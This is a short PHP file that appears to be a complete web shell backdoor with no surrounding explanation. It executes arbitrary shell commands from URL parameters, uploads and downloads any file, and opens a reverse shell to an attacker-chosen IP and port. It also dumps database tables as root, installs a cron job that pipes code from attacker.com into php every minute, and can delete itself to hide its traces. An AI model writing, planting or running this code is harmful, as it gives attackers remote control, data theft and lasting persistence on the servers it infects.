
<?php

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: ".$_FILES['file']['name'];
}
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($file));
        readfile($file);
    }
}
if(isset($_GET['reverse'])) {
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    if(function_exists('fsockopen')) {
        $sock = fsockopen($ip, $port);
        $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
    }
}
if(isset($_GET['dump'])) {
    $db = new PDO('mysql:host=localhost;dbname=information_schema', 'root', '');
    $result = $db->query('SELECT table_name FROM tables');
    while($row = $result->fetch()) {
        echo $row[0]."\n";
    }
}
if(isset($_GET['persist'])) {
    file_put_contents('/etc/cron.d/backdoor', '* * * * * root curl http://attacker.com/backdoor.php | php');
}
if(isset($_GET['destroy'])) {
    unlink(__FILE__);
}
if(isset($_GET['info'])) {
    echo "User: ".system('whoami')."\n";
    echo "OS: ".php_uname()."\n";
    echo "Path: ".__DIR__."\n";
}
?>
